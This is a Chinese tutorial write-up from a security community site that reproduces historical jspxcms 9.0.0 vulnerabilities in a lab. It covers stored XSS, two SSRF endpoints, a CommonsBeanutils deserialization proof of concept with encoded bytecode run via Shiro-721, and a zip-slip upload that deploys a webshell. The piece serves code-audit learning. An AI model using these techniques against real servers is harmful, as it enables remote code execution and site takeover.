---
title: "文章 - jspxcms历史漏洞分析与复现-JAVA  - 先知社区"
source: "https://xz.aliyun.com/news/10339?time__1311=eqUxRDgiwx9Dn7DlxGrF%2BGO8%3D3AIvAIdx&u_atoken=58ffd92897a87d3db887a2d1b87884ae&u_asig=0a47309317423660547604959e00f7"
author:
published:
created: 2025-03-19
description: "先知社区是一个安全技术社区，旨在为安全技术研究人员提供一个自由、开放、平等的交流平台。"
tags:
  - "clippings"
---
jspxcms历史漏洞分析与复现-JAVA

## 前言

之前一直在做PHP相关的代码审计，但是PHP越来越不行了，所以开始转向学习JAVA相关的安全知识，学了快一年了，最近复现了一下jspxcms的历史漏洞，学完之后感觉很适合刚开始学习JAVA代码审计的师傅，所以总结了一下才有这篇文章。

## 环境依赖

- 系统：Windows10
- 中间件：[https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.58/bin/apache-tomcat-9.0.58-windows-x64.zip](https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.58/bin/apache-tomcat-9.0.58-windows-x64.zip)
- 数据库：用phpstudy携带的5.7.26版本即可
- jspxcms安装包(部署到Tomcat用来复现)：[https://www.ujcms.com/uploads/jspxcms-9.0.0-release.zip](https://www.ujcms.com/uploads/jspxcms-9.0.0-release.zip)
- jspxcms源码包(部署到IDEA进行分析)：[https://www.ujcms.com/uploads/jspxcms-9.0.0-release-src.zip](https://www.ujcms.com/uploads/jspxcms-9.0.0-release-src.zip)

## 部署过程

##### 一、jspxcms安装包部署到Tomcat

解压好jspxcms安装包后，将Tomcat的ROOT目录替换为jspxcms的ROOT目录。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/7f4f8a8b8a2f868e9c1a4b957e4971eb.png)  
修改application.properties数据库信息，最后启动Tomcat就部署完成了。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/557cc0217d9c33d1a5ce3e37ed05ac8c.png)

##### 二、jspxcms源码部署到IDEA

使用IDEA打开解压好的源码目录，由于使用了SpringBoot，直接启用主程序Application即可。

## 漏洞复现

### 一、XSS

在首页随便打开一条新闻，评论需要登录，先注册一个用户，然后提交评论，使用burpsuite抓包。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/1eb37780ef0938a9714825d224cd8369.png)  
查看请求包可以看到请求路径是/comment\_submit，通过路径定位到源码。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/38738bdab2f9cdf44d23e590bb1bb6d0.png)  
在IDEA使用Ctrl+Shift+F搜索comment\_submit，很容易就可以找到，在此处下断点进行调试。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/fe5dbf135b55c21806f652b2351aba4a.png)  
重新发布一条评论，回到 IDEA，可以看到变量 text 接收了评论的内容，然后又调用了 submit。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/41d7df19e75f1356e2960a5fdaf2f84d.png)  
跟进这个 submit，在调用 service 层进行业务处理的位置下断点。可以看到使用了 comment 对象的属性去保存 text 然后传递给 service.save ，text 的内容没有被改变。跟进 service.save 在调用 dao 层的位置下断点。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ba48344a8762dca51adfd2a9c3107c09.png)  
可以看到看到 text 的内容还是没有改变，跟到这里就行了，因为 dao 层一般只做跟数据库相关的操作，不会有任何安全处理。就这样评论的内容被写入到数据库了。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e91c3841f3c89c6fd732cf875bdbc3ad.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/d588b20ad8c0bfd007b9464522c90105.png)  
但是在文章页面并没有触发XSS，所以需要寻找是否有其他页面可以触发。在 burpsute 可以看到评论的内容在请求 /comment\_list 时得到，并且该内容进行了HTML实体编码。使用 IDEA 的搜索功能查找该前端页面。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/299d60d0d96043baeded78bba51beaa9.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/1ca63edbb3bff1fd1c73f2b9cff7af13.png)  
直接到实际处理数据的 list 方法下断点进行调试。跟进 site.getTemplate 可以看到前端页面路径是 /1/default/sys\_comment\_list.html。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2d38f62ac612557b8e0470de262d7580.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a8a75eb8623fee33674f70680c8fe132.png)  
查看该页面是如何做转义处理的，在 pom.xml 查看项目依赖，可以看到项目使用的前端框架是 freemarker。结合 sys\_comment\_list.html 的内容与说明文档可知前端页面使用了 escape 标签进行 HTML 实体编码。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c7e85624d0db6da5721c0c50f0130079.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/1a5bf696f1cd8bfe0806b5261617944c.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0ee6a64870c2179c40a1959c38814cb7.png)  
那么找找跟评论相关并且没有 escape 标签的前端页面，找到了 sys\_member\_space\_comment.html 符合条件。使用IDEA搜索，查看如何才能访问到 sys\_member\_space\_comment.html，可以看到在 sys\_member\_space.html 下参数 type 等于 comment 那么 sys\_member\_space\_comment.html 就会被包含 。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/6e8e8c85ee176ce1ac9bd032caae2e3d.png)  
查看如何访问 sys\_member\_space.html，可以看到文件名被定义为常量，space 方法使用了该常量，也就是说访问路径的格式为 /space/{id} 时就能触发 XSS 了。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/62c5f4df6a44ff9a16dce7b0ab3e4fa2.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/25c1bfb7af60105580c96ee8d813a5ab.png)  
XSS漏洞触发效果如下所示。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/fc397b7121a627a8587087e53d36bac4.png)

### 二、SSRF

审计 SSRF 时需要注意的敏感函数：

```
URL.openConnection()
URL.openStream()
HttpClient.execute()
HttpClient.executeMethod()
HttpURLConnection.connect()
HttpURLConnection.getInputStream()
HttpServletRequest()
BasicHttpEntityEnclosingRequest()
DefaultBHttpClientConnection()
BasicHttpRequest()
```

#### 第一处 SSRF：

直接使用 IDEA 搜索敏感函数，找到一处使用了 HttpClient.execute() 的方法 fetchHtml()，它被当前类的另一个 fetchHtml() 调用。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/76004fd1f0cd6094cec3c740c3c291d7.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/fd3df8031669e1a6ac674831d1f3a94c.png)  
在 fetchUrl() 调用了 fetchHtml()，并且这个方法可以直接被 HTTP 访问。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ac9be1270a3ac19bab6be45f02464c09.png)  
使用 python 开启一个简易的 http 服务进行测试，测试效果如下所示，成功触发 SSRF。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/9661ac006988ba034b06dbabd5e5a58d.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/99d55dfd72480f00485aebe3aab6a8df.png)

#### 第二处 SSRF：

搜索 openConnection ，可以看到在方法 ueditorCatchImage() 下，参数 source\[\] 直接可控，当执行到 conn.getContentType().indexOf("image") 时就会去请求相应的资源。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/32b7f1acaadd9a43b122d48a8dbac844.png)  
搜索调用 ueditorCatchImage() 方法的位置，可以看到访问路径为 /ueditor，action 参数需要等于 catchimage。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5e55ba16d7a9283f1765fab7bcb4958a.png)  
构造 payload 触发漏洞，如下所示成功触发 SSRF。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0c0851a4a8c969736904403a377db860.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/b415343bc0ce2bff0d9d42b45b69271a.png)

### 三、RCE

#### 第一处 反序列化RCE

在审计 RCE 时需要先查看项目使用了哪些依赖包，可以看到项目中的依赖包符合 ysoserial 中的 CommonsBeanutils1 的条件，但是依赖包版本有一些差异。![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/af7692a5d467983c371c9f3a206e31be.png)  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/0b2ad88e71066fe4486024056361a7f1.png)  
我们直接在项目中创建一个 test 类进行测试，查看反序列化是否能成功执行，我在测试时发现反序列 ysoserial 的 CommonsBeanutils1 并不能成功，然后我使用之前跟p牛学的payload可以成功弹出计算器，如下图所示。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/3578a0050a17e9781a68ef1d78feb4a7.png)  
**Payload：**

```
package com.jspxcms.core.test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class test {
    public static void main(String[] args) throws Exception{

        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTEhlbGxvOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHACYBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwAGQAaBwAnDAAoACkBAAhjYWxjLmV4ZQwAKgArAQAFSGVsbG8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAwACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABEACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAEwAEABQADQAVAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=");

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "xxx");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add("x");
        queue.add("x");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("src\\main\\java\\com\\jspxcms\\core\\test\\ser.txt"));
        out.writeObject(queue);
        out.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream("src\\main\\java\\com\\jspxcms\\core\\test\\ser.txt"));
        in.readObject();
        in.close();
    }

    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
```

经过测试反序列漏洞是可以利用的，现在需要一处接收反序列化数据触发漏洞的点。继续查看依赖包发现使用了 Apache Shiro 并且版本小于 1.4.2，可以利用 Shiro-721。这里我使用 [https://github.com/inspiringz/Shiro-721](https://github.com/inspiringz/Shiro-721) 进行测试。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/283e5c1e6fdbc6691960ec39cf9d92a7.png)  
爆破出可以攻击的 rememberMe Cookie 大概需要一个多小时，如下界面所示。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2468fc7c09b249fac3467b9180729dcf.png)  
进行测试成功弹出计算器，反序列化 RCE 利用成功。  

#### 第二处 文件上传RCE

这个漏洞在文件管理的压缩包上传功能，上传的压缩包会被自动解压，如果我们在压缩包中放入 war 包并配合解压后目录穿越 war 包就会被移动到 tomcat 的 webapps 目录，而 tomcat 会自动解压 war 包。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/1fbe63fd9dc3b40abe8a898f749a6823.png)  
这里我使用冰蝎的 jsp webshell [冰蝎下载链接](https://github.com/rebeyond/Behinder "冰蝎下载链接")，将 webshell 打包成 war 包。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4681e859dd705b6bb69a5b2e59f19b70.png)  
然后将 war 包打包成压缩文件。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ce5f7ef2a0816285348b6df19adb5560.png)  
注意：这里测试需要启动 tomcat 做测试，而不是 IDEA 的 SpringBoot，否则可能无法成功。  
上传完之后连接 webshell 成功 RCE。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/4977c6d1aca2cb3a994d0c62904839ee.png)  
分析漏洞产生的原因，抓取文件上传的请求包，通过请求路径使用 IDEA 定位到代码。  
  
  
到 super.zipUpload 处下断点进行调试，继续跟入 AntZipUtils.unzip(）。  
  
可以看到文件名没有做安全处理，执行到 fos.write 时 shell.war 就被写入到 tomcat 的 webapps 目录了，这里的目录名不太对劲，因为是在 IDEA 启动 SpringBoot 进行调试的，无须在意，分析到这里就结束了。  
  
为什么不直接上传 jsp 文件 getshell 呢？我们试一下，发现响应 404 文件不存在，并且文件路径前加了 /jsp。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a75f97da44582d01ac89b0bbc14416c7.png)  
通过调试发现 JspDispatcherFilter.java 会对访问的 jsp 文件路径前加 /jsp，这就是不直接上传 jsp 文件 getshell的原因。而我们使用压缩包的方式会将 shell.war 解压到 tomcat 的 webapps 目录，这相当于一个新的网站项目JspDispatcherFilter.java 是管不着的。  

## 参考资料

书籍：JAVA代码审计（入门篇）  
[https://www.freebuf.com/articles/others-articles/229928.html](https://www.freebuf.com/articles/others-articles/229928.html)  
[https://www.cnblogs.com/xiaozi/p/13239046.html](https://www.cnblogs.com/xiaozi/p/13239046.html)

[5 人收藏](https://xz.aliyun.com/news/) [3 人喜欢](https://xz.aliyun.com/news/) [转载](https://xz.aliyun.com/news/) [分享](https://xz.aliyun.com/news/)

0 条评论

![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/01be0ad5a56a23c4143fe3259704ffe8.png)

没有评论

  [发布投稿](https://xz.aliyun.com/news/release)

热门文章

- [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/45ab2ff96051bd152aee34ba2eec3801.png)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/45ab2ff96051bd152aee34ba2eec3801.png)

[Merlin后渗透利用框架之Merlin Agent远控木马剖析](https://xz.aliyun.com/news/16796)
- [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2191061098574d88276d308529350997.png)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/2191061098574d88276d308529350997.png)

[cyberstrikelab—Thunder](https://xz.aliyun.com/news/16753)
- [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ab1fa540a2ce43f55e06f7e259f193c4.png)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/ab1fa540a2ce43f55e06f7e259f193c4.png)

[内核攻防-(2)致盲EDR](https://xz.aliyun.com/news/16779)
- [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e83c84d5393249b2e9245a0d019eaf69.png)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/e83c84d5393249b2e9245a0d019eaf69.png)

[超干信息收集，让资产说NO！](https://xz.aliyun.com/news/16765)
- [![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/8e27210c96a37537388b5c889e3835e4.png)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/8e27210c96a37537388b5c889e3835e4.png)

[先知社区新版上线公告](https://xz.aliyun.com/news/16567)

近期热点

- [一周](https://xz.aliyun.com/news/)
- [月份](https://xz.aliyun.com/news/)
- [季度](https://xz.aliyun.com/news/)

- 1 [Merlin后渗透利用框架之Merlin Agent远控木马剖析](https://xz.aliyun.com/news/16796)
- 2 [cyberstrikelab—Thunder](https://xz.aliyun.com/news/16753)
- 3 [内核攻防-(2)致盲EDR](https://xz.aliyun.com/news/16779)
- 4 [超干信息收集，让资产说NO！](https://xz.aliyun.com/news/16765)
- 5 [先知社区新版上线公告](https://xz.aliyun.com/news/16567)

暂无相关信息

暂无相关信息

优秀作者

- [

1

阿里云先知

贡献值：100

](https://xz.aliyun.com/users/90660)

目录

- **

前言
- **

环境依赖
- **

部署过程

- [一、jspxcms安装包部署到Tomcat](https://xz.aliyun.com/news/)
- [二、jspxcms源码部署到IDEA](https://xz.aliyun.com/news/)
- **

漏洞复现

- [一、XSS](https://xz.aliyun.com/news/)
- [二、SSRF](https://xz.aliyun.com/news/)
- [第一处 SSRF：](https://xz.aliyun.com/news/)
- [第二处 SSRF：](https://xz.aliyun.com/news/)
- [三、RCE](https://xz.aliyun.com/news/)
- [第一处 反序列化RCE](https://xz.aliyun.com/news/)
- [第二处 文件上传RCE](https://xz.aliyun.com/news/)
- **

参考资料

转载

标题

作者：你好

http://www.a.com/asdsabdas

文章转载自

复制到剪贴板